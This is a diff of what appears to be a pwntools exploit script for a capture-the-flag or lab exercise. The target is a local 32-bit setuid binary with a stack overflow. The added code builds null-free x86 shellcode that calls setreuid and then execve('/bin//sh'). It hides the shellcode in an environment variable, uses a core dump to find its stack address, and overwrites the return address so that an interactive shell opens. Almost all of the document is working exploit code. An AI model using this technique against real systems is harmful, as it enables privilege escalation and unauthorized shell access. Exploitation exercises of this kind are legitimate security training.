@@ -3,12 +3,37 @@ import os
 
 DEBUG = False 
 
+shellcode = asm('''
+xor    eax,eax
+xor    al,0x32
+int    0x80
+mov    ebx,eax
+mov    ecx,eax
+xor    eax,eax
+xor    al,0x47
+int    0x80
+xor    ecx,ecx
+xor    edx,edx
+xor    eax,eax
+xor    al,0xb
+xor    ebx,ebx
+push   ebx
+push   0x68732f6e
+push   0x69622f2f
+mov    ebx,esp
+int    0x80
+''') 
+
+env = {"a": shellcode}
+file = './stack-ovfl-use-envp-32'
+
 # crash the process to get a core file and find the buffer address (still boilerplate)
 
-io = process('./stack-ovfl-sc-32', env={}, setuid=False)
+io = process(file, env=env, setuid=False)
 io.sendline(cyclic(10000)) 
 io.wait()
 core = io.corefile
+shellcode_address = core.stack.find(shellcode)
 buffer_address = core.stack.find(cyclic(50))
 max_len = cyclic(10000).find(p32(core.fault_addr))
 os.unlink(core.path) 
@@ -17,36 +42,20 @@ os.unlink(core.path)
 if DEBUG:
     context.log_level = 'DEBUG'
     context.terminal = ['tmux', 'splitw', '-h']
-    io = gdb.debug('./stack-ovfl-sc-32', env={}, gdbscript='''
-b *input_func+110
+    io = gdb.debug(file, env=env, gdbscript='''
+b main
 continue
 ''')
 
 else:
-    io = process('./stack-ovfl-sc-32', env={})
+    io = process(file, env=env)
 
 
 # END SETUP BOILERPLATE
 # BEGIN CHALLENGE-SPECIFIC CODE
 
-shellcode = asm('''
-mov    eax,0x32
-int    0x80
-mov    ebx,eax
-mov    ecx,eax
-mov    eax,0x47
-int    0x80
-mov    ecx,0x0
-mov    edx,0x0
-mov    eax,0xb
-push   0x0
-push   0x68732f6e
-push   0x69622f2f
-mov    ebx,esp
-int    0x80
-''') 
 
-payload = shellcode + b"A" * (max_len - len(shellcode)) + p32(buffer_address)
+payload = b"A" * (max_len) + p32(shellcode_address)
 io.send(payload)
 io.interactive()
 
